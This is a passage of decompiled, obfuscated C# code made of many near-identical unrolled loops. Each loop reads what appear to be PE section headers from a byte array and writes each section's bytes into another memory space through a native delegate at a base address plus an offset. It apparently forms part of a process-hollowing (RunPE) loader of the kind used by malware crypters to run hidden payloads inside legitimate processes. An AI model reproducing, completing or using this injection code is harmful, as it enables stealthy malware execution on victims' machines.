						((byte*)ptr)[4100] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 2004))), array166, array166.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4100] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4104] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4104] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 2016)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 2020)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 2024)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4102] = ((*(int*)((byte*)ptr + 2020) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4102] != 0)
					{
						byte[] array167;
						checked
						{
							array167 = new byte[*unchecked((int*)((byte*)ptr + 2020)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 2024), array167, 0, array167.Length);
						((byte*)ptr)[4103] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 2016))), array167, array167.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4103] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4107] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4107] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 2028)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 2032)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 2036)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4105] = ((*(int*)((byte*)ptr + 2032) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4105] != 0)
					{
						byte[] array168;
						checked
						{
							array168 = new byte[*unchecked((int*)((byte*)ptr + 2032)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 2036), array168, 0, array168.Length);
						((byte*)ptr)[4106] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 2028))), array168, array168.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4106] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4110] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4110] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 2040)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 2044)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 2048)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4108] = ((*(int*)((byte*)ptr + 2044) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4108] != 0)
					{
						byte[] array169;
						checked
						{
							array169 = new byte[*unchecked((int*)((byte*)ptr + 2044)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 2048), array169, 0, array169.Length);
						((byte*)ptr)[4109] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 2040))), array169, array169.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4109] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4113] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4113] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 2052)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 2056)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 2060)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4111] = ((*(int*)((byte*)ptr + 2056) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4111] != 0)
					{
						byte[] array170;
						checked
						{
							array170 = new byte[*unchecked((int*)((byte*)ptr + 2056)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 2060), array170, 0, array170.Length);
						((byte*)ptr)[4112] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 2052))), array170, array170.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4112] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4116] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4116] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 2064)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 2068)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 2072)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4114] = ((*(int*)((byte*)ptr + 2068) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4114] != 0)
					{
						byte[] array171;
						checked
						{
							array171 = new byte[*unchecked((int*)((byte*)ptr + 2068)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 2072), array171, 0, array171.Length);
						((byte*)ptr)[4115] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 2064))), array171, array171.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4115] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4119] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4119] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 2076)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 2080)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 2084)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4117] = ((*(int*)((byte*)ptr + 2080) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4117] != 0)
					{
						byte[] array172;
						checked
						{
							array172 = new byte[*unchecked((int*)((byte*)ptr + 2080)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 2084), array172, 0, array172.Length);
						((byte*)ptr)[4118] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 2076))), array172, array172.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4118] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4122] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4122] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 2088)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 2092)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 2096)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4120] = ((*(int*)((byte*)ptr + 2092) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4120] != 0)
					{
						byte[] array173;
						checked
						{
							array173 = new byte[*unchecked((int*)((byte*)ptr + 2092)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 2096), array173, 0, array173.Length);
						((byte*)ptr)[4121] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 2088))), array173, array173.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4121] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4125] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4125] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 2100)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 2104)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 2108)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4123] = ((*(int*)((byte*)ptr + 2104) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4123] != 0)
					{
						byte[] array174;
						checked
						{
							array174 = new byte[*unchecked((int*)((byte*)ptr + 2104)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 2108), array174, 0, array174.Length);
						((byte*)ptr)[4124] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 2100))), array174, array174.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4124] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4128] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4128] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 2112)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 2116)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 2120)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4126] = ((*(int*)((byte*)ptr + 2116) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4126] != 0)
					{
						byte[] array175;
						checked
						{
							array175 = new byte[*unchecked((int*)((byte*)ptr + 2116)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 2120), array175, 0, array175.Length);
						((byte*)ptr)[4127] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 2112))), array175, array175.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4127] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4131] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4131] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 2124)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 2128)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 2132)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4129] = ((*(int*)((byte*)ptr + 2128) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4129] != 0)
					{
						byte[] array176;
						checked
						{
							array176 = new byte[*unchecked((int*)((byte*)ptr + 2128)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 2132), array176, 0, array176.Length);
						((byte*)ptr)[4130] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 2124))), array176, array176.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4130] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4134] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4134] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 2136)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 2140)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 2144)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4132] = ((*(int*)((byte*)ptr + 2140) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4132] != 0)
					{
						byte[] array177;
						checked
						{
							array177 = new byte[*unchecked((int*)((byte*)ptr + 2140)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 2144), array177, 0, array177.Length);
						((byte*)ptr)[4133] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 2136))), array177, array177.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4133] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4137] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4137] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 2148)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 2152)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 2156)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4135] = ((*(int*)((byte*)ptr + 2152) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4135] != 0)
					{
						byte[] array178;
						checked
						{
							array178 = new byte[*unchecked((int*)((byte*)ptr + 2152)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 2156), array178, 0, array178.Length);
						((byte*)ptr)[4136] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 2148))), array178, array178.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4136] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4140] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4140] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 2160)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 2164)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 2168)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4138] = ((*(int*)((byte*)ptr + 2164) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4138] != 0)
					{
						byte[] array179;
						checked
						{
							array179 = new byte[*unchecked((int*)((byte*)ptr + 2164)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 2168), array179, 0, array179.Length);
						((byte*)ptr)[4139] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 2160))), array179, array179.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4139] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4143] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4143] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 2172)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 2176)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 2180)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4141] = ((*(int*)((byte*)ptr + 2176) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4141] != 0)
					{
						byte[] array180;
						checked
						{
							array180 = new byte[*unchecked((int*)((byte*)ptr + 2176)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 2180), array180, 0, array180.Length);
						((byte*)ptr)[4142] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 2172))), array180, array180.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4142] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4146] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4146] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 2184)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 2188)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 2192)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4144] = ((*(int*)((byte*)ptr + 2188) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4144] != 0)
					{
						byte[] array181;
						checked
						{
							array181 = new byte[*unchecked((int*)((byte*)ptr + 2188)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 2192), array181, 0, array181.Length);
						((byte*)ptr)[4145] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 2184))), array181, array181.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4145] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4149] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4149] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 2196)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 2200)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 2204)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4147] = ((*(int*)((byte*)ptr + 2200) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4147] != 0)
					{
						byte[] array182;
						checked
						{
							array182 = new byte[*unchecked((int*)((byte*)ptr + 2200)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 2204), array182, 0, array182.Length);
						((byte*)ptr)[4148] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 2196))), array182, array182.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4148] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4152] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4152] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 2208)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 2212)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 2216)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4150] = ((*(int*)((byte*)ptr + 2212) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4150] != 0)
					{
						byte[] array183;
						checked
						{
							array183 = new byte[*unchecked((int*)((byte*)ptr + 2212)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 2216), array183, 0, array183.Length);
						((byte*)ptr)[4151] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 2208))), array183, array183.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4151] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4155] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4155] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 2220)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 2224)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 2228)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4153] = ((*(int*)((byte*)ptr + 2224) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4153] != 0)
					{
						byte[] array184;
						checked
						{
							array184 = new byte[*unchecked((int*)((byte*)ptr + 2224)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 2228), array184, 0, array184.Length);
						((byte*)ptr)[4154] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 2220))), array184, array184.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4154] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4158] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4158] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 2232)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 2236)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 2240)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4156] = ((*(int*)((byte*)ptr + 2236) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4156] != 0)
					{
						byte[] array185;
						checked
						{
							array185 = new byte[*unchecked((int*)((byte*)ptr + 2236)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 2240), array185, 0, array185.Length);
						((byte*)ptr)[4157] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 2232))), array185, array185.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4157] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
